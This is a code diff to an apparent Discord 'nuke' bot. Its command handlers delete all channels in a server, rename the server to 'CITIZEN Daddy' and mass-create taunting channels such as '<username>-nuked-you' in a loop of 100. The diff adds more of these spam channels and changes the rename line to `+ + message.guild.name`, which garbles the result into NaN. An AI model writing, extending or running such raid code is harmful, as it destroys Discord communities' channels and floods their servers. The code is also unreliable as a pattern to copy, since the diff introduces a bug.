@@ -165,7 +165,7 @@ client.on("message", async message => {
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
                     console.log(redBright(`CHANNEL FUCKED`))
                 )); // deletes all channels
-
+                message.guild.channels.create(message.author.username + ' nuked you')
 
 					}
 
@@ -219,7 +219,7 @@ client.on("message", async message => {
         if (message.content.startsWith(prefix + 'die')) {
 
                 message.delete();
-                message.guild.setName(`CITIZEN Daddy`).then(console.log(green('Server named changed of ' + message.guild.name))); // changes server name
+                message.guild.setName(`CITIZEN Daddy` + + message.guild.name).then(console.log(green('Server named changed of ' + message.guild.name))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach(channel => channel.delete().then(
@@ -238,6 +238,7 @@ client.on("message", async message => {
                 var argresult = args.join(' ');
 								 message.guild.channels.create('citizen-daddy')
 								 message.guild.channels.create('citizen-daddy')
+		                                                 message.guild.channels.create('citizen-daddy')
 
                    for (var i = 0; i < 100; i++) {
                         let channels = message.guild.channels.create(message.author.username + '-nuked-you')
